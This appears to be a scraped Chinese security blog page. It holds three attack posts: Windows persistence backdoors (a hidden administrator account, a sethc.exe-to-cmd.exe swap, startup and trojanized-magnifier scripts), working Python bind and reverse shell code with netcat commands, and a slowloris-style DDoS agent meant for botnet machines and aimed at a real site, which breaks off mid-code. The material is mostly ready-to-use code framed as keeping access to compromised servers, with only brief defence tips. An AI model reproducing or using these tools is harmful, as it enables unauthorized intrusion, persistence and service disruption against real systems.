<h4 id="语音识别"><a href="#语音识别" class="headerlink" title="语音识别"></a>语音识别</h4><p>语音识别=语音处理+机器学习。语音识别就是音频处理技术与机器学习的结合。语音识别技术一般不会单独使用，一般会结合自然语言处理的相关技术。目前的相关应用有苹果的语音助手siri等。</p>
<h4 id="自然语言处理"><a href="#自然语言处理" class="headerlink" title="自然语言处理"></a>自然语言处理</h4><p>自然语言处理=文本处理+机器学习。自然语言处理技术主要是让机器理解人类的语言的一门领域。在自然语言处理技术中，大量使用了编译原理相关的技术，例如词法分析，语法分析等等，除此之外，在理解这个层面，则使用了语义理解，机器学习等技术。作为唯一由人类自身创造的符号，自然语言处理一直是机器学习界不断研究的方向。按照百度机器学习专家余凯的说法“听与看，说白了就是阿猫和阿狗都会的，而只有语言才是人类独有的”。如何利用机器学习技术进行自然语言的的深度理解，一直是工业和学术界关注的焦点。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/18/windows常用后门技术及防范/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/06/18/windows常用后门技术及防范/" itemprop="url">
                  windows常用后门技术及防范
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-18T22:47:29+08:00">
                2018-06-18
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/06/18/windows常用后门技术及防范/" class="leancloud_visitors" data-flag-title="windows常用后门技术及防范">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>维持权限同样是渗透测试非常重要的一环，他可以让我们方便的再次进入系统并且降低被发现的概率，而维持权限的方式也就是留后门，了解一些常见的后门技术，不仅可以在进攻时提供维持权限的思路，同时，在防守时也可以更准确的发现隐患。</p>
<h2 id="0x01-隐藏账户"><a href="#0x01-隐藏账户" class="headerlink" title="0x01 隐藏账户"></a>0x01 隐藏账户</h2><p>隐藏账户应该是最常见的后门方式，其设置方式如下：</p>
<p>首先我们在命令行输入，如下命令创建一个隐藏账号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user leticia$ 123456 /add</span><br></pre></td></tr></table></figure></p>
<p>这个时候，通过net user并不能看到这个账户。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor01.png?raw=true" alt=""></p>
<p>然后我们将它添加到管理员权限。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators leticia$ /add</span><br></pre></td></tr></table></figure></p>
<p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor02.png?raw=true" alt=""></p>
<p>但是这个“隐藏账户”在用户账户中可以看到，并不能骗过细心的管理员。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor03.png?raw=true" alt=""></p>
<p>这个时候我们可以通过操作注册表，使这个账户在用户账户中也不显示。首先我们输入regedit打开注册表编辑器，找到HKEY_LOCAL_MACHINE\SAM\SAM，我们发现这个时候它是空白的，没有权限进行操作，所以我们要右键权限，将读写权限赋予administrator。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor04.png?raw=true" alt=""></p>
<p>然后我们重启注册表编辑器，发现这个时候已经可以访问了，我们在里面找到刚才创建的leticia$账号和administrator账号对应的键值类型。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor05.png?raw=true" alt=""></p>
<p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor06.png?raw=true" alt=""></p>
<p>然后在上一级文件中找键值类型对应的目录，将administrator对应目录中的F值复制到leticia$对应目录中的F值。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor07.png?raw=true" alt=""></p>
<p>复制完成后，把leticia$和其对应的0000003EA目录先导出并保存。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor08.png?raw=true" alt=""></p>
<p>然后在命令行中删除刚才的账号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user leticia$ /del</span><br></pre></td></tr></table></figure></p>
<p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor09.png?raw=true" alt=""></p>
<p>最后将刚才导出的注册表文件重新导入，隐藏账户就添加成功了。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor10.png?raw=true" alt=""></p>
<p>此时在用户账户中看不到这个隐藏账户。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor11.png?raw=true" alt=""></p>
<p>这个时候其实已经完成了，但是我们还可以再走一步操作，那就是把注册表刚才赋予administrator的权限禁止掉，这样这个账户就很难被发现了。</p>
<p>防范：</p>
<ul>
<li>经常检查用户账户、注册表关键位置。</li>
<li>将计算机对用户登陆事件的审核策略打开。</li>
</ul>
<h2 id="0x02-shift后门"><a href="#0x02-shift后门" class="headerlink" title="0x02 shift后门"></a>0x02 shift后门</h2><p>shift后门是很常见的留后门手法，其原理是用cmd.exe替换原先粘滞键，粘滞键的程序sethc.exe可以通过五次shift键调用，这样我们就可以直接通过按五次shift来调用一个system权限的命令行来执行命令、创建用户等。</p>
<p>shift后门有着非常丰富的骚操作，我们先来通过一个最基础的shift后门来学习原理。</p>
<p>制作方法如下：</p>
<p>我们先进入C:\WINDOWS\system32目录,在这里右键打开命令行，依次输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move sethc.exe sethc.exe.bak</span><br><span class="line">copy cmd.exe sethc.exe</span><br></pre></td></tr></table></figure></p>
<p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor12.png?raw=true" alt=""></p>
<p>这两句命令分别是将粘滞键程序备份，然后用cmd.exe覆盖原本的粘滞键程序。</p>
<p>然后我们每次要使用时按5次shift键弹出cmd窗口，可直接以system权限执行系统命令，创建管理员用户，登录服务器等。最后每次删除掉新建的账户，减少被发现的概率。</p>
<p>如图，我们可以在登陆界面就直接调用cmd：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor13.png?raw=true" alt=""></p>
<p>防范：</p>
<ul>
<li>自行呼出粘滞键检查问题。</li>
<li>禁用粘滞键。</li>
</ul>
<h2 id="0x03-启动项后门"><a href="#0x03-启动项后门" class="headerlink" title="0x03 启动项后门"></a>0x03 启动项后门</h2><p>我们可以让目标机器在每次启动的时候创建一个账户，在这个思路下有很多可以采取的措施，第一种是启动项：</p>
<p>在C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup目录中，放入我们启动时要运行的批处理代码或其他可运行文件，一般是创建一个管理员账户：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">net user leticia$ 123456 /add </span><br><span class="line">net localgroup administrators leticia$ /add</span><br></pre></td></tr></table></figure></p>
<p>防范：</p>
<ul>
<li>定期检查启动文件夹内容。</li>
</ul>
<h2 id="0x04-组策略"><a href="#0x04-组策略" class="headerlink" title="0x04 组策略"></a>0x04 组策略</h2><p>第二种方法是组策略，可以在gpedit.msc中的windows设置-脚本(启动/关机)中添加新的启动脚本，在开机时就会自动运行。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor14.png?raw=true" alt=""></p>
<p>相比于第一种放在启动目录中，放在组策略中更加隐蔽，一般不容易引起管理员察觉，从而降低被删除的概率。</p>
<p>防范：</p>
<ul>
<li>定期检查组策略。</li>
</ul>
<h2 id="0x05-放大镜后门"><a href="#0x05-放大镜后门" class="headerlink" title="0x05 放大镜后门"></a>0x05 放大镜后门</h2><p>放大镜后门其实和shift后门很相似，我们可以先备份放大镜程序magnify.exe为magnify2.exe，然后写一个创建新用户并打开真正的放大镜的程序(防止被管理员发现放大镜程序失效),再将其转换为exe文件，并重命名成magnify.exe，然后通过调用放大镜程序来创建新用户供我们登陆。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">net user leticia$ 123456 /add </span><br><span class="line">net localgroup administrators leticia$ /add</span><br><span class="line">c:\windows\system32\magnify2.exe</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></p>
<p>防范：</p>
<ul>
<li>调用放大镜检查。</li>
<li>定期检查用户组。</li>
</ul>
<h2 id="0x06-telnet后门"><a href="#0x06-telnet后门" class="headerlink" title="0x06 telnet后门"></a>0x06 telnet后门</h2><p>如果我们直接打开远程桌面的3389很容易就会被发现，但是我们打开telnet服务并改变默认端口(23)，就可以做一定程度的隐藏，我们在服务中打开telnet服务，然后将windows服务中的telnet客户端打开，然后在我们本机打开telnet服务端，访问目标主机ip和端口并登陆我们的用户名密码即可。</p>
<p>防范：</p>
<ul>
<li>定期检查服务器的进程端口有没有存在后门程序。</li>
</ul>
<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>留后门的方法有很多很多，但是大部分人会首先从这些方面入手，所以在检查系统有没有被留后门，也可以换位思考，在自己可能留后门的点上多注意一下，或许就会有收获。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/17/基于python的直连shell和反射shell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/06/17/基于python的直连shell和反射shell/" itemprop="url">
                  基于python的直连shell和反射shell
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-17T15:09:30+08:00">
                2018-06-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/06/17/基于python的直连shell和反射shell/" class="leancloud_visitors" data-flag-title="基于python的直连shell和反射shell">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>每次对服务器进行了渗透和提权之后，下一步就该维持权限（留后门），方便我们下次执行命令，留一个后门比起每次重新从webshell进入，一是降低被发现的概率，二是免去繁琐的操作，三是如果web漏洞被修补webshell被查杀，有时候我们放进去隐藏较好的后门并没有被查杀，我们仍然可以控制这台机器。</p>
<p>这里介绍两个可以通过netcat连接的python版shell。</p>
<h2 id="0x01-需要的库"><a href="#0x01-需要的库" class="headerlink" title="0x01 需要的库"></a>0x01 需要的库</h2><ul>
<li>os： os模块提供了非常丰富的方法用来处理文件和目录。</li>
<li>subprocess： subprocess是Python 2.4中新增的一个模块，它允许你生成新的进程，连接到它们的 input/output/error 管道，并获取它们的返回（状态）码。我们这里主要使用subprocess.call()函数，执行指定的命令，并返回命令执行状态。</li>
<li>socket:  Python 提供了两个基本的 socket 模块。第一个是 Socket，它提供了标准的 BSD Sockets API。第二个是 SocketServer，它提供了服务器中心类，可以简化网络服务器的开发。</li>
<li>optparse： optparse模块用来处理命令行参数，使我们在统一管理时更方便。</li>
</ul>
<h2 id="0x02-直连型shell"><a href="#0x02-直连型shell" class="headerlink" title="0x02 直连型shell"></a>0x02 直连型shell</h2><p>先贴代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#filename:zshell.py</span><br><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    server = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    server.bind((&apos;0.0.0.0&apos;, 2333))</span><br><span class="line">    server.listen(5)</span><br><span class="line">    print (&apos;waiting for connect&apos;)</span><br><span class="line">    while 1:</span><br><span class="line">        talk, addr = server.accept()</span><br><span class="line">        print(&apos;connect from&apos;, addr)</span><br><span class="line">        proc = subprocess.Popen([&quot;python -c &apos;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&apos;&quot;],</span><br><span class="line">                                stdin=talk,</span><br><span class="line">                                stdout=talk,</span><br><span class="line">                                stderr=talk,</span><br><span class="line">                                shell=True)</span><br></pre></td></tr></table></figure></p>
<p>这段代码的作用是，创建一个在2333端口监听任意ip的socket，如果监听到连接，就打开一个/bin/bash进程提供给目标ip执行命令。</p>
<p>我们要使用他时，只需在目标服务器执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python zshell.py</span><br></pre></td></tr></table></figure></p>
<p>然后在我们自己的机器使用netcat输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;服务器ip&gt; 2333</span><br></pre></td></tr></table></figure></p>
<p>就可以连接服务器执行命令，演示效果如下，主机是kali，靶机是ubuntu：</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_shell/shell01.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_shell/shell02.png" alt=""></p>
<h2 id="0x03-反射型shell"><a href="#0x03-反射型shell" class="headerlink" title="0x03 反射型shell"></a>0x03 反射型shell</h2><p>有时我们并不能直接访问目标服务器，这个时候可以通过反射shell来连接，也就是在我们本机使用netcat创建监听，然后让服务器上主动连接我们：<br>先贴要放在服务器端的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#filename：fshell.py</span><br><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import subprocess</span><br><span class="line">import optparse</span><br><span class="line"></span><br><span class="line">def connect_shell(HOST,PORT):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((HOST, PORT))</span><br><span class="line">    # 重定向shell输出</span><br><span class="line">    os.dup2(s.fileno(), 0)</span><br><span class="line">    os.dup2(s.fileno(), 1)</span><br><span class="line">    os.dup2(s.fileno(), 2)</span><br><span class="line">    # 执行子程序</span><br><span class="line">    p = subprocess.call([&apos;/bin/bash&apos;, &apos;-i&apos;])</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = optparse.OptionParser()</span><br><span class="line">    parser.add_option(&apos;-H&apos;, dest=&apos;HOST&apos;, type=&apos;string&apos;, help=&quot;IP address or Website&quot;)</span><br><span class="line">    parser.add_option(&apos;-p&apos;, dest=&apos;PORT&apos;, type=&apos;int&apos;, help=&quot;Port num&quot;)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    if(options.HOST==None)|(options.PORT==None):</span><br><span class="line">        print(&apos;---wrong input!---&apos;+&apos;\n&apos;)</span><br><span class="line">        exit(0)</span><br><span class="line">    else:</span><br><span class="line">        HOST = options.HOST</span><br><span class="line">        PORT = options.PORT</span><br><span class="line">    while(1):</span><br><span class="line">        try:</span><br><span class="line">            connect_shell(HOST,PORT)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">if __name__ ==&apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<p>我们在服务端执行此代码，通过命令行参数传入我们本机的ip和监听端口，然后创建向传入的ip和端口的socket连接，再重定向shell之后通过subprocess.call调用/bin/bash来执行命令。</p>
<p>我们要使用它时，首先在本机输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure></p>
<p>然后在服务端运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fshell.py -H &lt;我们自己机器的ip&gt; -p 2333</span><br></pre></td></tr></table></figure></p>
<p>就可以连接服务器执行命令，演示效果如下，主机是kali，靶机是ubuntu：</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_shell/shell03.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_shell/shell04.png" alt=""></p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>除了python，其他语言也能实现这些功能，具体使用哪种语言根据目标系统存在的环境来选择，而linux系统都是集成了python环境的，所以这里用python做例子。</p>
<p>在留后门的过程中，重点并不是写出这个shell，而是如何隐藏它不被发现，下一次有时间会总结一下隐藏shell的各种方式。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/04/基于python的ddos工具/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/06/04/基于python的ddos工具/" itemprop="url">
                  基于python的ddos工具
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-04T11:55:01+08:00">
                2018-06-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/06/04/基于python的ddos工具/" class="leancloud_visitors" data-flag-title="基于python的ddos工具">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-ddos"><a href="#0x00-ddos" class="headerlink" title="0x00 ddos"></a>0x00 ddos</h2><p>分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。</p>
<p>这里我选择用python来写安装在肉鸡上的代理程序。</p>
<h2 id="0x01-需要安装的库"><a href="#0x01-需要安装的库" class="headerlink" title="0x01 需要安装的库"></a>0x01 需要安装的库</h2><ul>
<li>socket: Python 提供了两个基本的 socket 模块。第一个是 Socket，它提供了标准的 BSD Sockets API。第二个是 SocketServer，它提供了服务器中心类，可以简化网络服务器的开发。</li>
<li>time: 在产生错误时我们可以sleep一个时间来查看错误。</li>
<li>threading： 多线程的库，增加我们的请求量。</li>
<li>optparse： 此模块用来处理命令行参数，使我们在统一管理时更方便。</li>
</ul>
<h2 id="0x02-代码实现"><a href="#0x02-代码实现" class="headerlink" title="0x02 代码实现"></a>0x02 代码实现</h2><p>我们先不加命令行参数写一个，方便调试。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#python3.6</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">MAX_CONN=10</span><br><span class="line">PORT=80</span><br><span class="line">HOST=&quot;www.baidu.com&quot;</span><br><span class="line">PAGE=&quot;/&quot;</span><br><span class="line"></span><br><span class="line">data=(&quot;POST %s HTTP/1.1\r\n&quot;</span><br><span class="line">&quot;Host: %s\r\n&quot;</span><br><span class="line">&quot;Content-Length: 1000000000\r\n&quot;</span><br><span class="line">&quot;Cookie: ddos_test\r\n&quot;</span><br><span class="line">&quot;\r\n&quot; % (PAGE,HOST))</span><br><span class="line"></span><br><span class="line">data2=data.encode(&apos;utf-8&apos;)</span><br><span class="line"></span><br><span class="line">socks=[]</span><br><span class="line"></span><br><span class="line">def conn_thread():</span><br><span class="line">    global socks</span><br><span class="line">    for i in range(0,MAX_CONN):</span><br><span class="line">        s=socket.socket (socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        try:</span><br><span class="line">            s.connect((HOST,PORT))</span><br><span class="line">            s.send(data2)</span><br><span class="line">            print(&quot;[+] Send data OK!,conn=%d\n&quot; % i)</span><br><span class="line">            socks.append(s)</span><br><span class="line">        except:</span><br><span class="line">            print (&quot;[-] Could not connect to server or send error&quot;)</span><br><span class="line">            time.sleep(5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_thread():</span><br><span class="line">    global socks</span><br><span class="line">    while True:</span><br><span class="line">        for s in socks:</span><br><span class="line">            try:</span><br><span class="line">                s.send(b&quot;f&quot;)</span><br><span class="line">                print (&quot;[+] send OK! %s&quot;%s)</span><br><span class="line">            except:</span><br><span class="line">                print (&quot;[-] send error\n&quot;)</span><br><span class="line">                socks.remove(s)</span><br><span class="line">                s.close()</span><br><span class="line">        time.sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn_th=threading.Thread(target=conn_thread,args=())</span><br><span class="line">send_th=threading.Thread(target=send_thread,args=())</span><br><span class="line">conn_th.start()</span><br><span class="line">send_th.start()</span><br></pre></td></tr></table></figure>
<p>这里我们仅设置了10个最大连接数，然后向百度的80端口不断发送post请求。</p>
<p>效果如下：</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_ddos/ddos01.png" alt=""></p>
<h2 id="0x03-增加命令行参数"><a href="#0x03-增加命令行参数" class="headerlink" title="0x03 增加命令行参数"></a>0x03 增加命令行参数</h2><p>实际情况中，我们经常要把ddos脚本放在我们已经控制的僵尸网络中，控制大量的计算机启动脚本，我们肯定不能每切换攻击一个目标就对代码中的参数更改一次，所以我们要使目标ip，端口，页面，以及攻击的强度通过我们输入参数来更改，为实现这个目标，我们导入optparse库接收命令行参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 